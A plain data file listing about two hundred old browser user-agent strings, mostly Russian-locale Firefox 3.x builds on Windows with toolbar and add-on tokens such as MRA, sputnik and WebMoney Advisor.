Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03278) Firefox/3.6.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03402) Firefox/3.6.8 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.6 (build 03278) Firefox/3.5.11
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.3 (build 02560) Firefox/3.5.11
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 GTB7.1 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.8) Gecko/20100722 AdCentriaIM/1.7 MRA 5.5 (build 02842) Firefox/3.6.8 GTB7.1 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.5 (build 02842) Firefox/3.6.6 (.NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03402) Firefox/3.6.13 sputnik 2.5.3.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03658) Firefox/3.6.8 (.NET CLR 3.5.30729) sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.6) Gecko/20091130 Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 AskTbSPC2/3.8.0.12304 Firefox/3.6.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 sputnik unknown WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03402) Firefox/3.6.8 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.5 (build 02842) Firefox/3.5.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.6 (build 03396) Firefox/3.6.2 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 AskTbMNC/3.8.0.12304 Firefox/3.5.11 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3
Mozilla/5.0 (Windows; Windows NT 5.1; rv:2.0b3) Gecko/20100804 Firefox/4.0b3
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.0.19) Gecko/2010031422 AdCentriaIM/1.7 Firefox/3.0.19 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.0.4506.2152)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03399) Firefox/3.6.8 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.6 (build 03278) Firefox/3.5.11 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 MRA 5.7 (build 03797) Firefox/3.6.28 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 AdCentriaIM/1.7 Firefox/3.6.8 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows NT 6.1; rv:16.0; WUID=bbb7c455369493bb70334f63a749f8c9; WTB=2938) Gecko/20100101 Firefox/16.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03399) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) Firefox/3.6 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.5 (build 02842) Firefox/3.6.8 (.NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.5 (build 02842) Firefox/3.0.19 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9
Mozilla/5.0 (Windows NT 5.1; rv:10.0.4) Gecko/20100101 Firefox/10.0.4
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1 GTB7.0 ( .NET CLR 3.5.30729) FBSMTWB
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.4 (build 02647) Firefox/3.6.8 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 sputnik 2.5.0.160
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.4 (build 02647) Firefox/3.0.19 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.10) Gecko/2009042316 MRA 5.6 (build 03278) Firefox/3.0.10 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Win98; ru; rv:1.8.1.16) Gecko/20080702 Firefox/2.0.0.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03658) Firefox/3.6.8 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.5 (build 02842) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03686) Firefox/3.6.8 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.4 (build 02620) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 AdCentriaIM/1.7 Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.19) Gecko/20110420 Firefox/3.5.19 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.4 (build 02645) Firefox/3.0.19
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.10) Gecko/2009042316 MRA 5.5 (build 02842) Firefox/3.0.10 sputnik 2.0.1.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.6 (build 03278) Firefox/3.0.19 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11 GTB7.1 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03402) Firefox/3.6.3 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03278) Firefox/3.6.8 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.5 (build 02842) Firefox/3.5.11 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.5) Gecko/2008120122 MRA 5.6 (build 03402) Firefox/3.0.5 sputnik 2.5.2.22
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.6 (build 03402) Firefox/3.0.19
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.12) Gecko/20100824 MRA 5.3 (build 02552) Firefox/3.5.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.7) Gecko/20100713 Firefox/3.6.7
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.5 (build 02842) Firefox/3.6.9 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.4 (build 02647) Firefox/3.6.9 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 AskTbPTV/3.8.0.12304 Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.5 (build 02842) Firefox/3.5.11 ( .NET CLR 3.5.30729) sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.12) Gecko/20100824 Firefox/3.5.12 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0 AlexaToolbar/alxf-2.17
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.12) Gecko/20100824 Firefox/3.5.12 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03686) Firefox/3.6.8 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 AskTbSPC/3.8.0.12304 Firefox/3.5.11 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 AdCentriaIM/1.7 MRA 5.5 (build 02842) Firefox/3.6.3 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03402) Firefox/3.6.8 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.12) Gecko/20100824 MRA 5.6 (build 03278) Firefox/3.5.12 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 ( .NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 AdCentriaIM/1.7 Firefox/3.6.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.6 (build 03278) Firefox/3.0.19 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03402) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.6 (build 03278) Firefox/3.6.9 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.5 (build 02842) Firefox/3.6.9 ( .NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.8) Gecko/20100723 Ubuntu/9.04 (jaunty) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.6 (build 03403) Firefox/3.6.9 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.3a5pre) Gecko/20100427 Minefield/3.7a5pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.6 (build 03399) Firefox/3.6.9 (.NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.12) Gecko/20100824 Firefox/3.5.12 (.NET CLR 2.0.50727)
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.9) Gecko/20100825 Ubuntu/10.04 (lucid) Firefox/3.6.9
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.9) Gecko/20100824 MRA 5.7 (build 03686) Firefox/3.6.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 (A9BBD8DD-E752-4ECA-2DAA-40E517312274) Firefox/3.6.9
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.6 (build 03278) Firefox/3.6.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03399) Firefox/3.6.8 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.6 (build 03278) Firefox/3.6.9
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03278) Firefox/3.6.8 ( .NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/2009033118 Mandriva/1.9.0.8-0.1mdv2008.1 (2008.1) Firefox/3.0.8
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11 (.NET CLR 3.5.30729) sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.7 (build 03658) Firefox/3.5.11 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.6.10 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.10) Gecko/20100504 MRA 5.6 (build 03402) Firefox/3.5.10 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.5 (build 02842) Firefox/3.0.19 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.5 (build 02842) Firefox/3.6.9 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.5.13 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.6.10 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 3.5.30729) sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.6 (build 03402) Firefox/3.6.6 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.9) Gecko/20100825 Ubuntu/9.10 (karmic) Firefox/3.6.9
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 ( .NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.6 (build 03402) Firefox/3.6.6 sputnik 2.2.0.32
Mozilla/5.0 (X11; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03278) Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 AskTbPTV/3.8.0.12304 Firefox/3.6.10 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9) Gecko/2008052906 Firefox/3.0 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 GTB7.1 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02790) Firefox/3.6.10 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8) Gecko/20051025 Firefox/1.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 (.NET CLR 3.5.30729) sputnik 2.0.1.20
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.12) Gecko/20100824 Firefox/3.5.12 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03402) Firefox/3.6.10 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.4 (build 02645) Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03686) Firefox/3.6.8 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.12) Gecko/20100824 MRA 5.5 (build 03116) Firefox/3.5.12 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 sputnik 2.5.2.42
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.8) Gecko/20100402 ALTLinux/Sisyphus/3.5.9-alt0.M50P.1 Firefox/3.5.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) AskTbBLT/3.8.0.12304 Firefox/3.6.10 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 GTB7.1 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 sputnik 2.3.0.96 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.13) Gecko/20100914 Firefox/3.5.13 sputnik 2.2.0.35 s023vp
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 ( .NET CLR 3.5.30729) sputnik 2.5.3.4
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.5 (build 02842) Firefox/3.6.8 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 sputnik 2.5.2.32
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.10) Gecko/20100915 Ubuntu/9.10 (karmic) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 MRA 5.5 (build 02842) Firefox/3.6.24
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 Firefox/3.5 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.4 (build 02644) Firefox/3.6.10 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.4 (build 02647) Firefox/3.0.19 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 MRA 5.6 (build 03278) Firefox/3.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.7) Gecko/20100723 Fedora/3.6.7-1.fc13 Firefox/3.6.7
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.10) Gecko/20100915 Ubuntu/10.04 (lucid) Firefox/3.6.10 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows NT 6.1; rv:17.0) Gecko/20100101 Firefox/17.0 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02812) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 AdCentriaIM/1.7 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1) Gecko/20090624 MRA 5.5 (build 02842) Firefox/3.5
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.5.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03399) AskTbPTV2/3.8.0.12304 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.5 (build 02743) Firefox/3.6.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 Firefox/3.5.13 (.NET CLR 2.0.50727)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.5.13 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.6) Gecko/2009011913 MRA 5.7 (build 03686) Firefox/3.0.6 (.NET Client 3.5.30729.01) sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03397) Firefox/3.6.3 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.5.13
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.6 (build 03402) Firefox/3.0.19 (.NET CLR 3.5.30729) sputnik 2.0.1.37
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.4 (build 02647) Firefox/3.6.10 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.4 (build 02647) Firefox/3.0.19 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 AskTbALSV5/3.15.4.23821 Firefox/3.6.28
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1 sputnik 2.5.3.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.6.10 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.6.10 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03649) Firefox/3.6.10 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.3.0.96
